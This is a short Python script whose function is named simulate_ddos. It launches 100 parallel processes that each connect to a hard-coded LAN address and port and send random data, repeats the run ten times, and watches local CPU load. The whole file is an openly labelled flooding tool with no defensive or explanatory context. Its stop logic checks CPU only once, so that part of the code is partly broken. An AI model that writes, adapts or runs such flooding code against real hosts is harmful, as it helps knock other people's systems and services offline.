import psutil
import time
import multiprocessing
import random
import os
import socket

def simulate_ddos(target_ip, target_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5)
        client.connect((target_ip, target_port))
        i = 1
        while i:
            data = os.urandom(1024)
            client.send(data)
            time.sleep(0.01)
            i -= 1
    except Exception as e:
        print(e)
    finally:
        client.close()

def monitor_cpu_usage(threshold = 80, stop_event = None):
    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        print(cpu_usage)
        if cpu_usage > threshold:
            stop_event.set()
            break
        time.sleep(0.2)

def main(target_ip, target_port, max_process=100, threshold=80):
    stop_event = multiprocessing.Event()
    cpu_monitor_process = multiprocessing.Process(target=monitor_cpu_usage, args=(threshold, stop_event))
    cpu_monitor_process.start()

    process = []
    for _ in range(max_process):
        p = multiprocessing.Process(target=simulate_ddos, args=(target_ip, target_port))
        p.start()
        process.append(p)

    if stop_event.is_set():
        for p in process:
            p.terminate()
        print("stop")

if __name__ == '__main__':
    target_ip = '192.168.3.9'
    target_port = 7777
    i = 10
    while i:
        main(target_ip, target_port)
        time.sleep(1)
        i -= 1
    